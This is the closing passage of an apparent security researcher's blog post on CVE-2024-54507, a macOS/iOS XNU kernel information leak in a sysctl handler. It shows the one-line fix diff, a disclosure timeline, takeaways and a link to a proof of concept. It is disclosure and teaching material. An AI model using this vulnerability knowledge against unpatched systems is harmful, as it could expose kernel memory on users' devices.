<pre>@@ -436,7 +436,7 @@ sysctl_udp_log_port SYSCTL_HANDLER_ARGS
 {
 #pragma unused(arg1, arg2)
    int error;
<span>-   int new_value = *(int *)oidp-&gt;oid_arg1;</span>
<span>+   int new_value = *(uint16_t *)oidp-&gt;oid_arg1;</span>

    error = sysctl_handle_int(oidp, &amp;new_value, 0, req);
    if (error != 0) {
</pre>

<h2>Timeline</h2>

<ul>
<li><strong>September 16, 2024</strong>: macOS 15.0 Sequoia was released with <code>xnu-11215.1.10</code>, the first public kernel release with this bug.</li>
<li><strong>Fall 2024</strong>: I reported this bug to Apple.</li>
<li><strong>December 11, 2024</strong>: macOS 15.2 and iOS 18.2 were released, fixing this bug, and assigning <code>CVE-2024-54507</code> to this issue.</li>
</ul>

<h2>Takeaways</h2>

<p>You can find a proof of concept <a href="https://github.com/jprx/CVE-2024-54507">here</a>.</p>

<p>This bug is a neat example of how difficult kernel programming can be.
Even the most seemingly innocuous loads can be deadly.
Even though the authors were careful to prevent integer overflows, information leakage was still possible due to the initial 4-byte load.</p>

<p>Specifically, I thought this was a neat case study demonstrating BSD sysctl's, and is a good cautionary tale to any would-be sysctl authors to be careful of the consequences of every memory access.</p>

<p>There are many kernel variants for all the different XNU platforms, some of which might leak some interesting data (I didn't check them all).
If anyone finds a cool way to use this bug, let me know!
Find me on X <a href="https://x.com/0xjprx">@0xjprx</a>.</p>

<h2>References</h2>

<p>[1] John Baldwin. "Implementing System Control Nodes (sysctl)". <a href="https://freebsdfoundation.org/wp-content/uploads/2014/01/Implementing-System-Control-Nodes-sysctl.pdf"><em>In: FreeBSD Journal (2014)</em></a>.</p>

<p>-ravi</p>

<p>January 23, 2025</p>
    </div></div>]]></description>
        </item>
    </channel>
</rss>